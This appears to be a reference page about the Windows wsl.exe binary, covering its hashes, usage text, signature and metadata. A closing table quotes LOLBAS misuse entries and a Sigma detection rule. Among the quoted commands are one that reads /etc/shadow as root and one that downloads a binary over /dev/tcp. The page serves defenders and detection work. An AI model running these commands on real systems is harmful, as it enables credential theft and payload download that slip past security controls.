---
title: wsl.exe | Microsoft Windows Subsystem for Linux Launcher
excerpt: What is wsl.exe?
---

# wsl.exe 

* File Path: `C:\Windows\system32\wsl.exe`
* Description: Microsoft Windows Subsystem for Linux Launcher

## Hashes

Type | Hash
-- | --
MD5 | `8357CB58911ACA02177B68548AB7F09E`
SHA1 | `4A0414FF25E988CAF013983308EA2E62C755E537`
SHA256 | `9FBB5B45C7E911D37E88F6EDA4D5D237F20F651235667EADAAA097B08EB8CC48`
SHA384 | `5E3F508BD96B7A816C925D64B43D6F0EB7F002A97BAFC872FCE6C7E25221E42605EA6703FB1FA5874E2313D9CB57723E`
SHA512 | `C4649EF23699AED45A74174D1DC6A8EE9DDA1545AD0A2CC25471052A8F6623F6FBA60973B08A11E2EAE1D3ED91C10DAFF571B5FF0C7B6A3C3F2ACFBE71343CD3`
SSDEEP | `1536:KSjpPNTp5/IKlq3+JGw5X7SEjSQkIcvxb6LE7oBn2xfc7JKaSCXRfFSKq0I7t1Wi:z7/vc+J3R7SSSQkIekLjZCsJK0fvOk6`
IMP | `CDBC30E57CA76EA08811485B115EB8D5`
PESHA1 | `E284B3E21CB3E4BCA50448E73C3CA233D71F3E5F`
PE256 | `042D4709F70EBC4447A0BBB3767638DDB66C9A5FE0278A18DBC1C645AEDFAABE`

## Runtime Data

### Usage (stdout):
```cmhg

Copyright (c) Microsoft Corporation. All rights reserved.

Usage: wsl.exe [Argument]

Arguments:

    --install <Options>
        Install Windows Subsystem for Linux features. If no options are specified,
        the recommended features will be installed along with the default distribution.

        To view the default distribution as well as a list of other valid distributions,
        use 'wsl --list --online'.

        Options:
            --distribution, -d [Argument]
                Specifies the distribution to be downloaded and installed by name.

                Arguments:
                    A valid distribution name (not case sensitive).
                    
                Examples:
                    wsl --install -d Ubuntu
                    wsl --install --distribution Debian

    --list, -l [Options]
        Lists distributions.

        Options:
            --online, -o
                Displays a list of available distributions for install with 'wsl --install'.

    --help
        Display usage information.

```

### Loaded Modules:

Path |
-- |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\system32\wsl.exe |


## Signature

* Status: Signature verified.
* Serial: `33000002EC6579AD1E670890130000000002EC`
* Thumbprint: `F7C2F2C96A328C13CDA8CDB57B715BDEA2CBD1D9`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: wsl.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1151 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1151
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/9fbb5b45c7e911d37e88f6eda4d5d237f20f651235667eadaaa097b08eb8cc48/detection


## Possible Misuse

*The following table contains possible examples of `wsl.exe` being misused. While `wsl.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_wsl_lolbin.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wsl_lolbin.yml) | `- '\wsl.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `Name: Wsl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `Description: Executes calc.exe from wsl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe -u root -e cat /etc/shadow`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe --exec bash -c 'cat file'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Path: C:\Windows\System32\wsl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- IOC: Child process from wsl.exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


